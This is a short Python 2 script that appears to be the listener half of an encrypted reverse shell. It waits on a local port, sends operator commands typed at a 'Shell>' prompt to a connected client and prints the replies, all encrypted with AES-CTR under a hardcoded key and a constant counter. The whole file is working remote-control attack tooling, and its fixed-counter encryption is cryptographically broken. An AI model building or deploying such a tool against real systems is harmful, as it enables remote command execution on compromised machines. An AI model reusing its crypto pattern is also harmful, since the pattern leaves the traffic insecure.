import socket
from Crypto.Cipher import AES

COUNTER = "O"*16
KEY = "O"*32
SERVER_IP = '127.0.0.1'
PORT = 8080

def decrypt(message):
    decrypto = AES.new(KEY, AES.MODE_CTR, counter=lambda:COUNTER)
    return decrypto.decrypt(message)

def encrypt(message):
    encrypto = AES.new(KEY, AES.MODE_CTR, counter=lambda:COUNTER)
    return encrypto.encrypt(message)

def connect():
    so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    so.bind((SERVER_IP, PORT))
    so.listen(1)
    print '[+] Listening incoming connections...'
    conn, addr = so.accept()
    print '[+] Connection from: ', addr

    while True:
        command = raw_input("Shell> ")
        if 'terminate' in command:
            conn.send(encrypt('terminate'))
            conn.close()
            break
        else:
            conn.send(encrypt(command))
            print decrypt(conn.recv(1024))

def main():
    connect()
main()
